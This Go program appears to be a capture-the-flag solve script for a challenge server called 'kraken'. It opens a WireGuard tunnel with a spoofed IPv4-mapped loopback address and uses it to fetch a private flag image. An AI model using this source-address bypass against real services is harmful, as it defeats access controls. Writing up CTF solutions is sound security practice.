// adapted from https://golangbot.com/webassembly-using-go/
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	"log"
	"net"
	"net/http"
	"net/netip"
	"os"
	"time"

	"golang.zx2c4.com/wireguard/device"
	"golang.zx2c4.com/wireguard/tun/netstack"
	"golang.zx2c4.com/wireguard/wgctrl/wgtypes"

	"kraken/util"
)

const server = "kraken.chal.pwni.ng"

func main() {
	res, err := getFile("/private/Flag/flag.jpg", server)
	if err != nil {
		log.Fatal(err)
	}

	img, _, err := image.Decode(bytes.NewReader(res))
	if err != nil {
		log.Fatalln(err)
	}

	out, _ := os.Create("./flag.jpeg")
	defer out.Close()

	jpeg.Encode(out, img, nil)
	fmt.Println("Flag written to flag.jpeg")
}

func getFile(filename string, hostname string) ([]byte, error) {
	// Generate ephemeral keypair and format server's public key.
	privKey, err := wgtypes.GeneratePrivateKey()
	if err != nil {
		return []byte{}, err
	}
	privKeyBytes, err := base64.StdEncoding.DecodeString(privKey.String())
	if err != nil {
		return []byte{}, err
	}
	serverPubKeyBytes, err := base64.StdEncoding.DecodeString(util.ServerPubKey)
	if err != nil {
		return []byte{}, err
	}

	// Make ephemeral ipv6 address.
	ephemAddr := netip.MustParseAddr("::ffff:127.0.0.1")

	// Make virtual device.
	tun, tnet, err := netstack.CreateNetTUN(
		[]netip.Addr{ephemAddr},
		[]netip.Addr{},
		util.MTU)
	if err != nil {
		return []byte{}, err
	}
	dev := device.NewDevice(tun, NewWSBind(privKey.PublicKey().String(), ephemAddr, hostname), device.NewLogger(device.LogLevelVerbose, ""))
	defer dev.Close()

	dev.IpcSet(fmt.Sprintf(`private_key=%s
public_key=%s
endpoint=[::]:%d
allowed_ip=::/0
`,
		hex.EncodeToString(privKeyBytes),
		hex.EncodeToString(serverPubKeyBytes),
		util.ServerPhysicalPort,
	))

	err = dev.Up()
	if err != nil {
		return []byte{}, err
	}

	client := http.Client{
		Transport: &http.Transport{
			DialContext: tnet.DialContext,
		},
		Timeout: 5 * time.Second,
	}
	url := fmt.Sprintf("http://%s/%s", net.JoinHostPort(util.ServerVirtualAddress, fmt.Sprint(fmt.Sprint(util.ServerVirtualPort))), filename)
	resp, err := client.Get(url)
	if err != nil {
		return []byte{}, err
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	dev.Close()

	if resp.StatusCode != 200 {
		return []byte{}, errors.New(string(body))
	}
	return body, nil
}
